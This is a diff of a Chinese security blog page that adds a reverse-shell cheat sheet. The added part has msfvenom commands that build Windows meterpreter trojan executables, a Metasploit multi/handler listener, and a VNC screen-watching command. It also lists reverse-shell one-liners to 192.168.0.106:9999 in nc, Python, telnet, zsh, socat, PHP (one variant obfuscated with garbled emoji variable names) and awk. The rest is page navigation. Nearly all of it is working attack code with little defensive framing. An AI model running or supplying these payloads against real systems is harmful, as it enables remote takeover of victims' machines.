+<li>加载监听</li>
+<li>执行木马</li>
+</ol>
+<h5 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;9999 -f exe -o reverse.exe
+msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;9999 -f exe -o reverse.exe
+msfvenom -p windows&#x2F;x64&#x2F;meterpreter_reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;9999 -f exe -o reverse.exe
+msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;9999 -f exe -o reverse.exe
+msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.0.106 LPORT&#x3D;9999 -f exe -o reverse.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h5 id="加载监听"><a href="#加载监听" class="headerlink" title="加载监听"></a>加载监听</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole
+msf5 &gt; use exploit&#x2F;multi&#x2F;handler
+msf5 exploit(multi&#x2F;handler) &gt; set PAYLOAD payload
+msf5 exploit(multi&#x2F;handler) &gt; set LHOST localhost
+msf5 exploit(multi&#x2F;handler) &gt; set LPORT port
+msf5 exploit(multi&#x2F;handler) &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h5 id="执行木马"><a href="#执行木马" class="headerlink" title="执行木马"></a>执行木马</h5><p><strong>执行命令时，如果出现中文乱码，使用chcp切换编码即可</strong></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chcp 65001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>监听显示器</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run vnc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h3 id="其他应用反弹shell"><a href="#其他应用反弹shell" class="headerlink" title="其他应用反弹shell"></a>其他应用反弹shell</h3><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -c sh 192.168.0.106 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h4 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">export RHOST&#x3D;&quot;192.168.0.106&quot;;export RPORT&#x3D;9999;python -c &#39;import 
+sys,socket,os,pty;s&#x3D;socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#39;
+
+python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,9999));os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">export RHOST&#x3D;&quot;192.168.0.106&quot;;export RPORT&#x3D;9999;python3 -c &#39;import 
+sys,socket,os,pty;s&#x3D;socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#39;
+
+python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.106&quot;,9999));os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39;
+
+python3 -c &#39;import os,pty,socket;s&#x3D;socket.socket();s.connect((&quot;192.168.0.106&quot;,9999));
+[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">TF&#x3D;$(mktemp -u);mkfifo $TF &amp;&amp; telnet 192.168.0.106 9999 0&lt;$TF | sh 1&gt;$TF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h4 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">zsh -c &#39;zmodload zsh&#x2F;net&#x2F;tcp &amp;&amp; ztcp 192.168.0.106 9999 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">socat TCP:192.168.0.106:9999 EXEC:sh
+
+socat TCP:192.168.0.106:9999 EXEC:&#39;sh&#39;,pty,stderr,setsid,sigint,sane<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);shell_exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);system(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);passthru(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);&#96;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#96;;&#39;
+php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);popen(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#39;
+php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.0.106&quot;,9999);$proc&#x3D;proc_open(&quot;sh&quot;, 
+array(0&#x3D;&gt;$sock, 1&#x3D;&gt;$sock, 2&#x3D;&gt;$sock),$pipes);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h4 id="php-Emoji"><a href="#php-Emoji" class="headerlink" title="php Emoji"></a>php Emoji</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php -r
+&#39;$ð•••&#x3D;&quot;1&quot;;$ð•••&#x3D;&quot;2&quot;;$ð•••&#x3D;&quot;3&quot;;$ð•••&#x3D;&quot;4&quot;;$ð•••&#x3D;&quot;5&quot;;$ð•••&#x3D;&quot;6&quot;;$ð•••&#x3D;&quot;7&quot;;$ð•••&#x3D;&quot;8&quot;;$ð•••&#x3D;&quot;9&quot;;$ð•••&#x3D;&quot;0&quot;;$ð•¤¢&#x3D;&quot; &quot;;$ð•¤•&#x3D;&quot;&lt;&quot;;$ð•¤ &#x3D;&quot;&gt;&quot;;$ð••±&#x3D;&quot;-
+&quot;;$ð••µ&#x3D;&quot;&amp;&quot;;$ð•¤©&#x3D;&quot;i&quot;;$ð•¤•&#x3D;&quot;.&quot;;$ð•¤¨&#x3D;&quot;&#x2F;&quot;;$ð•¥
+°&#x3D;&quot;a&quot;;$ð•••&#x3D;&quot;b&quot;;$ð••¶&#x3D;&quot;i&quot;;$ð•••&#x3D;&quot;h&quot;;$ð•••&#x3D;&quot;c&quot;;$ð•¤
+£&#x3D;&quot;d&quot;;$ð•••&#x3D;&quot;e&quot;;$ð•••&#x3D;&quot;f&quot;;$ð•••&#x3D;&quot;k&quot;;$ð•••&#x3D;&quot;n&quot;;$ð•••&#x3D;&quot;o&quot;;$ð•••&#x3D;&quot;p&quot;;$ð•¤•&#x3D;&quot;s&quot;;$ð•••&#x3D;&quot;x&quot;;$ð••• &#x3D; $ð•••. $ð•¤•. $ð•••. $ð•••. $ð•••. $ð•••. $ð•••. $ð•••. $ð•••;$ð••• &#x3D; &quot;192.168.0.106&quot;;$ð••» &#x3D; 9999;$ð••• &#x3D; &quot;sh&quot;. $ð•¤¢. $ð••±. $ð•¤©. $ð•¤¢. $ð•¤•. $ð••µ. $ð•••. $ð•¤¢. $ð•¤ . $ð••µ. $ð•••. $ð•¤¢. $ð•••. $ð•¤ . $ð••µ. $ð•••;$ð•¤£ &#x3D; $ð•••($ð•••,$ð••»);$ð••½ &#x3D; $ð•••. $ð•••. $ð•••. $ð•••;$ð••½($ð•••);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">awk &#39;BEGIN &#123;s &#x3D; &quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;192.168.0.106&#x2F;9999&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c !&#x3D; &quot;exit&quot;) close(s); &#125;&#125;&#39; &#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+
                 
             </div>
             <hr/>
@@ -1987,7 +3269,7 @@ uname<span class="token operator">=</span>admin<span class="token operator">&amp
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wwqstudy.github.io/2023/01220.html">http://wwqstudy.github.io/2023/01220.html</a>
+                    <a href="http://wwqstudy.github.io/2023/01221.html">http://wwqstudy.github.io/2023/01221.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -2072,13 +3354,13 @@ uname<span class="token operator">=</span>admin<span class="token operator">&amp
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/030136038.html">
+                <a href="/2023/032462972.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="VM questions">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="网络攻击与防范">
                         
-                        <span class="card-title">VM questions</span>
+                        <span class="card-title">网络攻击与防范</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -2089,7 +3371,7 @@ uname<span class="token operator">=</span>admin<span class="token operator">&amp
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-01
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-03-24
                         </span>
                         <span class="publish-author">
                             
